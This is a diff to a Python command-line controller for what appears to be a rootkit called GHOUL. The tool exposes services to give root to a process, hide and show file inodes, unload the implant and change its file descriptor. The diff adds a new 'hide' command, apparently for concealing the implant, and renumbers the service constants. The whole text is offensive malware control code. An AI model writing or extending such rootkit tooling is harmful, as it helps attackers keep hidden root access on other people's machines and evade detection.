@@ -18,13 +18,14 @@ ping_arg = int(os.environ.get('GHOUL_PING_ARG', 0)) or 666
 
 # service constants
 SERVICE_SHOW = 0
-SERVICE_UNLOAD = 1
-SERVICE_CHANGE_FD = 2
-SERVICE_PING = 3
-SERVICE_CHANGE_PING_ARG = 4
-SERVICE_GIVE_ROOT = 5
-SERVICE_HIDE_FILE_INODE = 6
-SERVICE_SHOW_FILE_INODE = 7
+SERVICE_HIDE = 1
+SERVICE_UNLOAD = 2
+SERVICE_CHANGE_FD = 3
+SERVICE_PING = 4
+SERVICE_CHANGE_PING_ARG = 5
+SERVICE_GIVE_ROOT = 6
+SERVICE_HIDE_FILE_INODE = 7
+SERVICE_SHOW_FILE_INODE = 8
 
 # SERVICE_GIVE_ROOT constants
 THIS_PID = 0
@@ -41,6 +42,10 @@ def service_request(cmd: int, arg: int):
 
 def show():
     service_request(SERVICE_SHOW, 0)
+
+
+def hide():
+    service_request(SERVICE_HIDE, 0)
 
 
 def unload():
@@ -97,6 +102,7 @@ if __name__ == '__main__':
     subparsers = parser.add_subparsers(dest='cmd')
 
     subparsers.add_parser('show')
+    subparsers.add_parser('hide')
     subparsers.add_parser('unload')
 
     change_fd_parser = subparsers.add_parser('change-fd')
@@ -149,6 +155,8 @@ if __name__ == '__main__':
     
     if args.cmd == 'show':
         show()
+    elif args.cmd == 'hide':
+        hide()
     elif args.cmd == 'unload':
         unload()
     elif args.cmd == 'change-fd':
